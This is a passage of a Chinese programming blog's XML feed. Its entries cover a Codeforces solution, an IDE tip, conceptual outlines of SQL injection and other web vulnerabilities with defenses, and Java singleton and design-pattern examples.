    <title>ACM经典问题-横竖表</title>
    <link href="/2021/05/03/ACM/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-%E6%A8%AA%E7%AB%96%E8%A1%A8/"/>
    <url>/2021/05/03/ACM/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-%E6%A8%AA%E7%AB%96%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://codeforces.com/contest/1506/problem/A">原题目链接</a></p><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>按列放数<br>单元格从1开始编号;单元格从左到右按列编号，在每列中从上到下编号;每个单元格的个数为比前一个单元格大1。<br>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210503125918720.png"></p><p>按行放数<br>单元格从1开始编号;单元格按行从上到下编号，在每行中从左到右编号;每个单元格的个数为比前一个单元格的个数大1。<br>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210503125945768.png"></p><p>第一行为单个整数t(1≤t≤104)。然后是测试用例。<br>每个测试用例由一行分别包含三个整数n,m, x(1≤n,m≤106,1≤x≤n)，其中n、m为表格的行数和列数，x为按列放时的数。求输出x所在的位置按行放的数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//输入</span><br><span class="hljs-number">5</span><br><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">11</span><br><span class="hljs-number">100</span> <span class="hljs-number">100</span> <span class="hljs-number">7312</span><br><span class="hljs-number">1000000</span> <span class="hljs-number">1000000</span> <span class="hljs-number">1000000000000</span><br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">1</span><br><span class="hljs-number">2</span><br><span class="hljs-number">9</span><br><span class="hljs-number">1174</span><br><span class="hljs-number">1000000000000</span><br></code></pre></div></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> t;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;t;<br>    <span class="hljs-keyword">while</span>(t--)&#123;<br>      <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> n,m,x;<br>      <span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;x;<br>      x-=<span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">int</span> row=(x%n);<br>      <span class="hljs-keyword">int</span> col=x/n;<br>      <span class="hljs-built_in">cout</span>&lt;&lt;row*m+col+<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//可以总结为一个公式</span><br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM经典问题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDEA背景换成图片</title>
    <link href="/2021/04/19/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/IDEA%E8%83%8C%E6%99%AF%E6%8D%A2%E6%88%90%E5%9B%BE%E7%89%87/"/>
    <url>/2021/04/19/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/IDEA%E8%83%8C%E6%99%AF%E6%8D%A2%E6%88%90%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>IDEA背景换成图片方式。</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="1-下载插件"><a href="#1-下载插件" class="headerlink" title="1.下载插件"></a>1.下载插件</h2><p>打开IDEA，File -&gt; Settings -&gt; Plugins ，在 Marketplace 中搜索 Backgroundimage 并下载（installed）。这里为已安装过了。</p><p><img src="https://img-blog.csdnimg.cn/20210419201738633.png"></p><h2 id="2-选择图片"><a href="#2-选择图片" class="headerlink" title="2.选择图片"></a>2.选择图片</h2><p>依次点击 File -&gt; Settings -&gt; Appearance&amp;Behavior -&gt;Appearance -&gt; Background Image -&gt;选择图片位置 -&gt; OK 。</p><p><img src="https://img-blog.csdnimg.cn/20210419202116732.png"></p><p><img src="https://img-blog.csdnimg.cn/20210419202227508.png"></p>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB常见漏洞(一)-SQL注入漏洞</title>
    <link href="/2021/04/19/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/04/19/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>WEB常见漏洞(一)。SQL注入漏洞。指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-SQL注入特点"><a href="#1-SQL注入特点" class="headerlink" title="1.SQL注入特点"></a>1.SQL注入特点</h2><blockquote><p>1.广泛性<br>任何一个基于SQL语言的数据库都可能被攻击，很多开发人员在编写Web应用程序时未对从输入参数、Web表单、cookie等接受到的值进行规范性验证和检测，通常会出现SQL注入漏洞。</p></blockquote><blockquote><p>2.隐蔽性<br>SQL注入语句一般都嵌入在普通的HTTP请求中，很难与正常语句区分开，所以当前许多防火墙都无法识别予以警告，而且SQL注入变种极多，攻击者可以调整攻击的参数，所以使用传统的方法防御SQL注入效果非常不理想。</p></blockquote><blockquote><p>3.危害大<br>攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网站用户的数据安全有极大的威胁。攻击者也可以通过获取到的数据，得到后台管理员的密码，然后对网页页面进行恶意篡改。这样不仅对数据库信息安全造成严重威胁，对整个数据库系统安全也影响重大。</p></blockquote><blockquote><p>4.操作方便<br>互联网上有很多SQL注入工具，简单易学，攻击过程简单，不需要专业知识也能自如运用。</p></blockquote><h2 id="2-注入过程"><a href="#2-注入过程" class="headerlink" title="2.注入过程"></a>2.注入过程</h2><p>第一步：SQL注入点探测。<br>第二步：收集后台数据库信息。<br>第三步：猜解用户名和密码。<br>第四步：查找Web后台管理入口。<br>第五步：入侵和破坏。</p><h2 id="3-变量类型注入"><a href="#3-变量类型注入" class="headerlink" title="3.变量类型注入"></a>3.变量类型注入</h2><h3 id="3-1数字型注入"><a href="#3-1数字型注入" class="headerlink" title="3.1数字型注入"></a>3.1数字型注入</h3><h3 id="3-2字符型注入"><a href="#3-2字符型注入" class="headerlink" title="3.2字符型注入"></a>3.2字符型注入</h3><h2 id="4-HTTP提交方式注入"><a href="#4-HTTP提交方式注入" class="headerlink" title="4.HTTP提交方式注入"></a>4.HTTP提交方式注入</h2><h3 id="4-1GET注入"><a href="#4-1GET注入" class="headerlink" title="4.1GET注入"></a>4.1GET注入</h3><h3 id="4-2POST注入"><a href="#4-2POST注入" class="headerlink" title="4.2POST注入"></a>4.2POST注入</h3><h3 id="4-3Cookie注入"><a href="#4-3Cookie注入" class="headerlink" title="4.3Cookie注入"></a>4.3Cookie注入</h3><h2 id="5-注入手法"><a href="#5-注入手法" class="headerlink" title="5.注入手法"></a>5.注入手法</h2><h3 id="5-1盲注"><a href="#5-1盲注" class="headerlink" title="5.1盲注"></a>5.1盲注</h3><h4 id="5-1-1基于布尔的盲注"><a href="#5-1-1基于布尔的盲注" class="headerlink" title="5.1.1基于布尔的盲注"></a>5.1.1基于布尔的盲注</h4><h4 id="5-1-2基于时间的盲注"><a href="#5-1-2基于时间的盲注" class="headerlink" title="5.1.2基于时间的盲注"></a>5.1.2基于时间的盲注</h4><h3 id="5-2联合查询注入"><a href="#5-2联合查询注入" class="headerlink" title="5.2联合查询注入"></a>5.2联合查询注入</h3><h3 id="5-3基于错误信息的注入"><a href="#5-3基于错误信息的注入" class="headerlink" title="5.3基于错误信息的注入"></a>5.3基于错误信息的注入</h3><h2 id="6-检测技术"><a href="#6-检测技术" class="headerlink" title="6.检测技术"></a>6.检测技术</h2><h3 id="6-1动态检测"><a href="#6-1动态检测" class="headerlink" title="6.1动态检测"></a>6.1动态检测</h3><h3 id="6-2静态检测"><a href="#6-2静态检测" class="headerlink" title="6.2静态检测"></a>6.2静态检测</h3><h2 id="7-防范措施"><a href="#7-防范措施" class="headerlink" title="7.防范措施"></a>7.防范措施</h2><h3 id="7-1分级管理"><a href="#7-1分级管理" class="headerlink" title="7.1分级管理"></a>7.1分级管理</h3><h3 id="7-2参数传值"><a href="#7-2参数传值" class="headerlink" title="7.2参数传值"></a>7.2参数传值</h3><h3 id="7-3基础过滤与二次过滤"><a href="#7-3基础过滤与二次过滤" class="headerlink" title="7.3基础过滤与二次过滤"></a>7.3基础过滤与二次过滤</h3><h3 id="7-4使用安全参数"><a href="#7-4使用安全参数" class="headerlink" title="7.4使用安全参数"></a>7.4使用安全参数</h3><h3 id="7-5漏洞扫描"><a href="#7-5漏洞扫描" class="headerlink" title="7.5漏洞扫描"></a>7.5漏洞扫描</h3><h3 id="7-6多层验证"><a href="#7-6多层验证" class="headerlink" title="7.6多层验证"></a>7.6多层验证</h3><h3 id="7-7数据库信息加密"><a href="#7-7数据库信息加密" class="headerlink" title="7.7数据库信息加密"></a>7.7数据库信息加密</h3><h4 id="7-7-1对称加密"><a href="#7-7-1对称加密" class="headerlink" title="7.7.1对称加密"></a>7.7.1对称加密</h4><p>即加密方和解密方都使用相同的加密算法和密钥，这种方案的密钥的保存非常关键，因为算法是公开的，而密钥是保密的，一旦密匙泄露，黑客仍然可以轻易解密。常见的对称加密算法有：AES、DES等。</p><h4 id="7-7-2非对称加密"><a href="#7-7-2非对称加密" class="headerlink" title="7.7.2非对称加密"></a>7.7.2非对称加密</h4><p>即使用不同的密钥来进行加解密，密钥被分为公钥和私钥，用私钥加密的数据必须使用公钥来解密，同样用公钥加密的数据必须用对应的私钥来解密，常见的非对称加密算法有：RSA等。</p><h4 id="7-7-3不可逆加密"><a href="#7-7-3不可逆加密" class="headerlink" title="7.7.3不可逆加密"></a>7.7.3不可逆加密</h4><p>利用哈希算法使数据加密之后无法解密回原数据，这样的哈希算法常用的有：md5、SHA-1等。</p>]]></content>
    
    
    <categories>
      
      <category>WEB常见漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OWASP常见漏洞-内容目录概括</title>
    <link href="/2021/04/18/OWASP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/OWASP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/"/>
    <url>/2021/04/18/OWASP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/OWASP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/</url>
    
    <content type="html"><![CDATA[<p>OWASP常见漏洞。内容目录概括。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h2 id="失效身份验证和会话管理"><a href="#失效身份验证和会话管理" class="headerlink" title="失效身份验证和会话管理"></a>失效身份验证和会话管理</h2><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h2 id="XML外部实体注入攻击（XXE）"><a href="#XML外部实体注入攻击（XXE）" class="headerlink" title="XML外部实体注入攻击（XXE）"></a>XML外部实体注入攻击（XXE）</h2><h2 id="存取控制中断"><a href="#存取控制中断" class="headerlink" title="存取控制中断"></a>存取控制中断</h2><h2 id="安全性错误配置"><a href="#安全性错误配置" class="headerlink" title="安全性错误配置"></a>安全性错误配置</h2><h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><h2 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h2><h2 id="使用具有已知漏洞的组件"><a href="#使用具有已知漏洞的组件" class="headerlink" title="使用具有已知漏洞的组件"></a>使用具有已知漏洞的组件</h2><h2 id="日志记录和监控不足"><a href="#日志记录和监控不足" class="headerlink" title="日志记录和监控不足"></a>日志记录和监控不足</h2>]]></content>
    
    
    <categories>
      
      <category>OWASP常见漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB常见漏洞-内容目录概括</title>
    <link href="/2021/04/18/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/"/>
    <url>/2021/04/18/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/</url>
    
    <content type="html"><![CDATA[<p>WEB网站常见漏洞。内容目录概括。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><h3 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h3><h3 id="3-代码注入"><a href="#3-代码注入" class="headerlink" title="3.代码注入"></a>3.代码注入</h3><h3 id="4-CRLF注入"><a href="#4-CRLF注入" class="headerlink" title="4.CRLF注入"></a>4.CRLF注入</h3><h3 id="5-Email头注入"><a href="#5-Email头注入" class="headerlink" title="5.Email头注入"></a>5.Email头注入</h3><h3 id="6-Host注入"><a href="#6-Host注入" class="headerlink" title="6.Host注入"></a>6.Host注入</h3><h3 id="7-LDAP注入"><a href="#7-LDAP注入" class="headerlink" title="7.LDAP注入"></a>7.LDAP注入</h3><h3 id="8-OS命令注入"><a href="#8-OS命令注入" class="headerlink" title="8.OS命令注入"></a>8.OS命令注入</h3><h3 id="9-XPath注入"><a href="#9-XPath注入" class="headerlink" title="9.XPath注入"></a>9.XPath注入</h3><h2 id="跨站点脚本-XSS-漏洞"><a href="#跨站点脚本-XSS-漏洞" class="headerlink" title="跨站点脚本(XSS)漏洞"></a>跨站点脚本(XSS)漏洞</h2><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h2 id="XML外部实体-XXE-漏洞"><a href="#XML外部实体-XXE-漏洞" class="headerlink" title="XML外部实体(XXE)漏洞"></a>XML外部实体(XXE)漏洞</h2><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2>]]></content>
    
    
    <categories>
      
      <category>WEB常见漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA设计模式(二)-单例模式</title>
    <link href="/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%BA%8C)-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <url>/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%BA%8C)-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>JAVA设计模式(二)。单例模式。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>所谓类的单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例。</p><h2 id="1-单例模式的饿汉式"><a href="#1-单例模式的饿汉式" class="headerlink" title="1.单例模式的饿汉式"></a>1.单例模式的饿汉式</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Bank bank1 = Bank.getOl();<br>        Bank bank2 = Bank.getOl();<br>        System.out.println( bank1 == bank2 );<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Bank</span><span class="hljs-params">()</span></span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Bank ol = <span class="hljs-keyword">new</span> Bank();<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Bank <span class="hljs-title">getOl</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> ol;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2-单例模式的懒汉式-线程不安全"><a href="#2-单例模式的懒汉式-线程不安全" class="headerlink" title="2.单例模式的懒汉式-线程不安全"></a>2.单例模式的懒汉式-线程不安全</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Bank b1 = Bank.getOl();<br>        Bank b2 = Bank.getOl();<br>        System.out.println(b1 == b2);<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Bank</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Bank ol = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Bank <span class="hljs-title">getOl</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-comment">//不同点</span><br>        <span class="hljs-keyword">if</span>(ol == <span class="hljs-keyword">null</span>) ol = <span class="hljs-keyword">new</span> Bank();<br>        <span class="hljs-keyword">return</span> ol;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="3-单例模式的懒汉式-线程安全"><a href="#3-单例模式的懒汉式-线程安全" class="headerlink" title="3.单例模式的懒汉式-线程安全"></a>3.单例模式的懒汉式-线程安全</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123; <br>        Bank b1 = Bank.getOl();<br>        Bank b2 = Bank.getOl();<br>        System.out.println(b1 == b2);<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Bank</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Bank ol = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> Bank <span class="hljs-title">getOl</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-comment">//不同点</span><br>        <span class="hljs-keyword">if</span>(ol == <span class="hljs-keyword">null</span>) ol = <span class="hljs-keyword">new</span> Bank();<br>        <span class="hljs-keyword">return</span> ol;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="4-饿汉式和懒汉式的区别"><a href="#4-饿汉式和懒汉式的区别" class="headerlink" title="4.饿汉式和懒汉式的区别"></a>4.饿汉式和懒汉式的区别</h2><p>懒汉式相较于饿汉式，延迟对象的创建，对于饿汉式来说就是对象加载时间过长。<br>饿汉式是线程安全的，懒汉式有安全和不安全的。</p>]]></content>
    
    
    <categories>
      
      <category>JAVA设计模式</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA设计模式(一)-设计模式类型目录及概括</title>
    <link href="/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%B8%80)-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%B1%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%A6%82%E6%8B%AC/"/>
    <url>/2021/04/18/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(%E4%B8%80)-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%B1%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%A6%82%E6%8B%AC/</url>
    
    <content type="html"><![CDATA[<p>JAVA设计模式。</p><h1 id="设计模式类型内容概括"><a href="#设计模式类型内容概括" class="headerlink" title="设计模式类型内容概括"></a>设计模式类型内容概括</h1><h2 id="一-创建型模式（5种）"><a href="#一-创建型模式（5种）" class="headerlink" title="一.创建型模式（5种）"></a>一.创建型模式（5种）</h2><h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><h3 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h3><h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><h2 id="二-结构型模式（7种）"><a href="#二-结构型模式（7种）" class="headerlink" title="二.结构型模式（7种）"></a>二.结构型模式（7种）</h2><h3 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h3><h3 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h3><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><h3 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h3><h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><h3 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h3><h3 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h3><h2 id="三-行为型模式（11种）"><a href="#三-行为型模式（11种）" class="headerlink" title="三.行为型模式（11种）"></a>三.行为型模式（11种）</h2><h3 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h3><h3 id="模板方法模式"><a href="#模板方法模式" class="headerlink" title="模板方法模式"></a>模板方法模式</h3><h3 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h3><h3 id="迭代子模式"><a href="#迭代子模式" class="headerlink" title="迭代子模式"></a>迭代子模式</h3><h3 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h3><h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><h3 id="备忘录模式"><a href="#备忘录模式" class="headerlink" title="备忘录模式"></a>备忘录模式</h3><h3 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h3><h3 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h3><h3 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h3><h3 id="解释器模式"><a href="#解释器模式" class="headerlink" title="解释器模式"></a>解释器模式</h3><hr><h2 id="设计模式简介"><a href="#设计模式简介" class="headerlink" title="设计模式简介"></a>设计模式简介</h2><p>设计模式是在大量的实践中总结和理论化之后优选的代码结构、编程风格、以及解决问题的思考方式。设计模式免去我们自己再思考和摸索。设计模式（Design pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。</p><p>设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理地运用设计模式可以完美地解决很多问题，每种模式在现实中都有相应的原理来与之对应，每种模式都描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是设计模式能被广泛应用的原因。</p><h2 id="设计模式的六大原则"><a 